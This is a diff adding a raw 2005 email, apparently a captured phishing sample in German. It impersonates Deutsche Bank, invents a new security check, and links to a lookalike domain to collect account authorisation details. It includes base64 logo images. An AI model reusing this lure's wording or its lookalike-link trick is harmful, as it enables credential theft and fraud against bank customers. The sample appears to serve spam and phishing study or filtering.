@@ -1,0 +1,196 @@
+From user@mail.example.com  Wed Oct  5 12:49:12 2005
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+	by example.com (Postfix) with ESMTP id 8C4842A88C
+	for <user@example.com>; Wed,  5 Oct 2005 12:49:12 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+	id 7CEDC621C92; Wed,  5 Oct 2005 12:49:12 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+	by mail.example.com (Example mail relay) with ESMTP id 2BC2A621C90
+	for <user@example.com>; Wed,  5 Oct 2005 12:49:12 -0400 (EDT)
+Received: (from user@localhost)
+	by mail.example.com id MAA10490
+	for user@example.com; Wed, 5 Oct 2005 12:49:11 -0400
+Received: from -1240214136 (AAubervilliers-151-1-22-160.w83-114.abo.wanadoo.fr [83.114.141.160])
+	by mail.example.com with SMTP id MAA10481
+	for <user@example.com>; Wed, 5 Oct 2005 12:49:00 -0400
+Received: from deutsche-bank.de (-1276033424 [-1240146704])
+	by AAubervilliers-151-1-22-160.w83-114.abo.wanadoo.fr (Qmailv1) with ESMTP id A0B6E68C9E
+	for <user@example.com>; Wed, 05 Oct 2005 11:44:55 -0500
+Date: Wed, 05 Oct 2005 11:44:55 -0500
+From: Deutsche Bank <security@deutsche-bank.de>
+X-Mailer: The Bat! (v2.00.0) Personal
+X-Priority: 3
+Message-ID: <3075775247.20051005114455@deutsche-bank.de>
+To: Jose <user@example.com>
+Subject: Deutsche Bank
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="----------5581DF2975D6F15"
+X-AntiVirus: checked by AntiVir MailGate (version: 2.0.1.5; AVE: 6.17.0.2; VDF: 6.17.0.5; host: AAubervilliers-151-1-22-160.w83-114.abo.wanadoo.fr)
+Content-Length: 9165
+Lines: 157
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 184
+
+This is a multi-part message in MIME format.
+
+------------5581DF2975D6F15
+Content-Type: multipart/related;
+	type="multipart/alternative";
+	boundary="----------2B2C7E679D5F528"
+
+------------2B2C7E679D5F528
+Content-Type: multipart/alternative;
+	boundary="----------37EB8BBA52028F3"
+
+------------37EB8BBA52028F3
+Content-Type: text/plain
+Content-Transfer-Encoding: 7bit
+
+Sehr geehrter Kunde, 
+
+Die Deutsche Bank sorgt immer fur die Sicherheit von unseren Kunden, deswegen werden von uns immer wieder neue Methoden zur Sicherung der Interessen von unseren Klienten entwickelt. 
+In der letzten Zeit wurden die Betrugereiversuche, die Geldmittel von den Bankkonten zu stehlen, haufiger geworden. Das Anwendungssystem der TAN - Aufstellung hat sich nicht ganz bewahrt. Die Schwindler haben verstanden, wie sie diese Schutzart umgehen konnen. 
+Wir haben sehr sorgfaltig jeden Diebstahl von den Konten behandelt und haben somit eine Liste von den Merkmalen der verdachtigen Operation gemacht. 
+Gegenwartig haben wir ein neues elektronisches Sicherheitssystem aufgebaut, das den Zugang zu den Bankkonten verhindert, das ist praktisch einsatzbereit. Scheint die Transaktion unsauber, so wird von dem System eine Geheimfrage gestellt. Bekommt das System keine Antwort, so werden das Konto und die laufende Transaktion bis zur Klarung der Umstande blockiert. 
+
+Wir bitten Sie, um das System richtig laufen zu lassen, die Form der zusatzlichen Autorisation auszufullen. 
+
+Wir hoffen, dass Sie unser neues Sicherheitssystem richtig einschatzen. 
+
+Danke fur die Zusammenarbeit, 
+Deutsche Bank
+
+------------37EB8BBA52028F3
+Content-Type: text/html
+Content-Transfer-Encoding: 7bit
+
+<html>
+<body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0"> 
+<table width="100%" border="0" cellpadding="10" cellspacing="0"> 
+ <tr> 
+ <td bgcolor="#000080"><div align="right"><img src="cid:qw.gif" width="199" height="54"></div></td> 
+ </tr> 
+ <tr> 
+ <td height="13" background="cid:qa.gif" bgcolor="#D9D9EC"></td> 
+ </tr> 
+ <tr> 
+ <td height="10" bgcolor="#D9D9EC"></td> 
+ </tr> 
+ <tr> 
+ <td bgcolor="#D9D9EC"><table width="100%" border="0" cellpadding="10" cellspacing="0" bgcolor="#FFFFFF"> 
+ <tr> 
+ <td><p><font size="2" face="Arial, Helvetica, sans-serif">Sehr geehrter Kunde, <br> 
+ <br> 
+ Die Deutsche Bank sorgt immer f&uuml;r die Sicherheit von unseren Kunden, deswegen werden von uns immer wieder neue Methoden zur Sicherung der Interessen von unseren Klienten entwickelt. <br> 
+ In der letzten Zeit wurden die Betr&uuml;gereiversuche, die Geldmittel von den Bankkonten zu stehlen, h&auml;ufiger geworden. Das Anwendungssystem der TAN - Aufstellung hat sich nicht ganz bew&auml;hrt. Die Schwindler haben verstanden, wie sie diese Schutzart umgehen k&ouml;nnen. <br> 
+ Wir haben sehr sorgf&auml;ltig jeden Diebstahl von den Konten behandelt und haben somit eine Liste von den Merkmalen der verd&auml;chtigen Operation gemacht. <br> 
+ Gegenw&auml;rtig haben wir ein neues elektronisches Sicherheitssystem aufgebaut, das den Zugang zu den Bankkonten verhindert, das ist praktisch einsatzbereit. Scheint die Transaktion unsauber, so wird von dem System <strong>eine Geheimfrage </strong> gestellt. Bekommt das System keine Antwort, so werden das Konto und die laufende Transaktion bis zur Kl&auml;rung der Umst&auml;nde blockiert. <br> 
+ <br> 
+ Wir bitten Sie, um das System richtig laufen zu lassen, <strong><a href="http://www.deutsche-bank.de.pbc_content.ser_obs_sic_grundlagen.backupservers12.com/mod/WebObjects/dbpbc.woa/"><font size="3">die Form der zus&auml;tzlichen Autorisation</font></a></strong> auszuf&uuml;llen. </font></p> 
+ <p><font size="2" face="Arial, Helvetica, sans-serif">Wir hoffen, dass Sie unser neues Sicherheitssystem richtig einschatzen. <br> 
+ <br> 
+ Danke f&uuml;r die Zusammenarbeit, <br> 
+ Deutsche Bank</font></p></td> 
+ </tr> 
+ </table> 
+ <p>&nbsp;</p></td> 
+ </tr> 
+ <tr> 
+ <td height="15" bgcolor="#000080"></td> 
+ </tr> 
+</table> 
+</body>
+</html>
+
+------------37EB8BBA52028F3--
+
+------------2B2C7E679D5F528
+Content-Type: image/gif; name="qa.gif"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="qa.gif"
+Content-ID: <qa.gif>
+
+R0lGODlhDAANAJEAABGQ3P///xiL1wAAACH5BAAAAAAALAAAAAAMAA0AAAIZlI8SycsCjHuS
+nknx081WzxmREpTmiaZmAQA7
+
+------------2B2C7E679D5F528
+Content-Type: image/gif; name="qw.gif"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="qw.gif"
+Content-ID: <qw.gif>
+
+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
+
+------------2B2C7E679D5F528--
+
+------------5581DF2975D6F15--
+
